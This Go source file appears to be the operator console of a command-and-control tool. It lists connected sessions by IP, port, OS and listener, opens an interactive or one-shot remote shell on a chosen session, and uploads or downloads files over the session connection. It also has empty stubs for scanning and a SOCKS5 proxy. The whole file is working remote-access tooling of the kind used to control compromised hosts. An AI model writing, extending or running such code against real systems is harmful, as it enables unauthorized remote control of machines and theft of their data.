package modules

import (
	"bufio"
	"eiradinner/internal/handler"
	"eiradinner/internal/structs"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

var SESSION_ID int = 0

func HandlerSession(reader *bufio.Reader) error {
	for {
		fmt.Print("session >")
		input, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("读取输入失败:", err)
			continue
		}
		command := strings.Fields(input)
		if len(command) == 0 {
			continue // 如果切片为空，直接跳过
		}
		commandfist := string(command[0])
		switch commandfist {
		case "list":
			ListSession()
		case "session":
			IntoSession(command, reader)
		case "delete":
			DeleteSession(command)
		case "exit":
			return nil
		default:
			fmt.Println("无效指令，使用 help 查看帮助")

		}
	}
}

func ListSession() {
	fmt.Printf("%-12s %-30s %-10s %-10s %-35s %-10s  %-10s\n", "SessionID", "IPAddress", "Port", "OS", "Path", "Status", "Listener")
	fmt.Println(strings.Repeat("-", 150))

	for _, session := range ALL_SESSIONS {
		fmt.Printf("%-12d %-15s %-10s %-10s %-35s %-10s  %-10s \n", session.SessionID, session.Address, session.Port, session.Os, session.Path, session.Status, session.Listener)
	}
}

func IntoSession(args []string, reader *bufio.Reader) {
	if len(args) != 2 {
		fmt.Print("使用方法： session  id ")
		return
	}
	sessionID, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Println("session id 错误")
		return
	}
	session, exists := ALL_SESSIONS[sessionID]
	if !exists {
		fmt.Println("session id 错误")
		return
	}
	fmt.Printf("进入session %d\n", sessionID)

	for {
		fmt.Printf("session %d >", sessionID)
		inputinsession, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("读取输入失败:", err)
			continue
		}
		// 进入session 之后的功能
		command := strings.Fields(inputinsession)
		if len(command) == 0 {
			continue // 如果切片为空，直接跳过
		}
		commandfist := string(command[0])
		switch commandfist {
		case "shell":
			if len(command) == 1 {
				GetShellInSession(command, reader, session)
			} else {
				EexcCommandInSession(handler.RemoveFirstOccurrence(inputinsession, "shell "), session)
			}
		case "upload":
			UploadFileInSession(command, session.Conn)
		case "download":
			DownloadFileInSession(command, session.Conn)
		case "scan":
			ScanInsession(command)
		case "socket proxy":
			BuildSocket5InSession(command)
		case "id": //查看当前session的id
			fmt.Println(session.SessionID)
		case "exit":
			return
		default:
			fmt.Println("无效指令，使用 help 查看帮助")

		}

	}

}

func DeleteSession(args []string) {
	if len(args) != 2 {
		fmt.Print("使用方法： session  id ")
		return
	}
	sessionID, err := strconv.Atoi(args[1])
	if err != nil {
		fmt.Println("session id 错误")
		return
	}
	session, exists := ALL_SESSIONS[sessionID]
	if !exists {
		fmt.Println("session id 错误")
		return
	}
	session.Conn.Close()
	delete(ALL_SESSIONS, sessionID)
	fmt.Printf("删除session %d\n", sessionID)
}

func GetShellInSession(args []string, reader *bufio.Reader, session *structs.Sessions) {
	// 只输入一个shell 就进入交互式shell
	if len(args) == 1 {
		for {
			fmt.Print("shell > ")
			input, _ := reader.ReadString('\n')
			if input == "exit\n" {
				break
			}
			handler.SendCommand(session.Conn, input)
		}

	}
}
func EexcCommandInSession(command string, session *structs.Sessions) {
	// fmt.Print(command)
	handler.SendCommand(session.Conn, command)
	// session.Conn.Write([]byte(strings.TrimSpace(command) + "\n"))
}

func ScanInsession(args []string) {

}

func BuildSocket5InSession(args []string) {

}

func UploadFileInSession(args []string, conn net.Conn) {
	if len(args) != 3 {
		fmt.Print("使用方法： upload <文件名>  <文件保存路径> ")
		return
	}
	fmt.Println(args)
	filepath := args[1]
	filedespath := args[2]
	file, err := os.Open(filepath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	// 获取文件信息
	fileInfo, err := file.Stat()
	print(fileInfo)
	if err != nil {
		fmt.Println("Error getting file info:", err)
		return
	}
	const chunkSize = 1024 * 1024 // 定义chunk大小为1M
	log.Println("文件大小为", fileInfo.Size())
	totalChunks := int(fileInfo.Size()+chunkSize-1) / chunkSize // chunkSize
	fmt.Print("开始分块传输")
	for i := 0; i < totalChunks; i++ {
		// 读取分块内容
		chunkContent := make([]byte, chunkSize)
		n, err := file.Read(chunkContent)
		fmt.Printf("读取数据为%d\n", n)
		if err != nil && err != io.EOF {
			fmt.Println("Error reading file:", err)
			return
		}
		chunkContent = chunkContent[:n]
		filesendmessage := structs.FileTransferMessage{
			MessageType:  2,
			Timestamp:    time.Now().Format(time.RFC3339),
			FilePath:     filedespath,
			FileSize:     fileInfo.Size(),
			ChunkNumber:  i + 1,
			TotalChunks:  totalChunks,
			ChunkContent: chunkContent,
		}
		messageBytes, err := json.Marshal(filesendmessage)
		fmt.Print(string(messageBytes))
		if err != nil {
			fmt.Println("Error marshaling message:", err)
			return
		}
		_, err = conn.Write(messageBytes)
		if err != nil {
			fmt.Println("Error sending message:", err)
			return
		}

		fmt.Printf("Sent chunk %d of %d\n", i+1, totalChunks)
	}

	fmt.Println("File sent successfully")
}

// fileaskmessage := structs.FileTransferMessage{
// 	MessageType: 5,
// 	Timestamp:   time.Now().Format(time.RFC3339),
// 	FilePath:    filename,
// }
// fmt.Println(fileaskmessage)
// jsonData, err := json.Marshal(fileaskmessage)
// if err != nil {
// 	fmt.Println("序列化失败:", err)
// 	return
// }
// fmt.Println(jsonData)
// // handler.FileNAME <- args[2] //向文件名中写入路径

// conn.Write(jsonData)
// fmt.Print("完成firename 发送")
// handler.CurrentDownloadFile = args[2] //向文件名中写入路径
// }
func DownloadFileInSession(args []string, conn net.Conn) {
	if len(args) != 3 {
		fmt.Print("使用方法： download <文件名>  <文件保存路径> ")
		return
	}
	fmt.Println(args)
	filename := args[1]
	fileaskmessage := structs.FileNameMessage{
		MessageType: 5,
		Timestamp:   time.Now().Format(time.RFC3339),
		FilePath:    filename,
	}
	fmt.Println(fileaskmessage)
	jsonData, err := json.Marshal(fileaskmessage)
	if err != nil {
		fmt.Println("序列化失败:", err)
		return
	}
	fmt.Println(jsonData)
	// handler.FileNAME <- args[2] //向文件名中写入路径

	conn.Write(jsonData)
	fmt.Print("完成firename 发送")
	handler.CurrentDownloadFile = args[2] //向文件名中写入路径
}

// func readResponse(session *structs.Sessions) (string, error) {
// 	message := make([]byte, 1024)
// 	n, err := session.Conn.Read(message)
// 	if err != nil {
// 		return "", err
// 	}
// 	return string(message[:n]), nil
// }
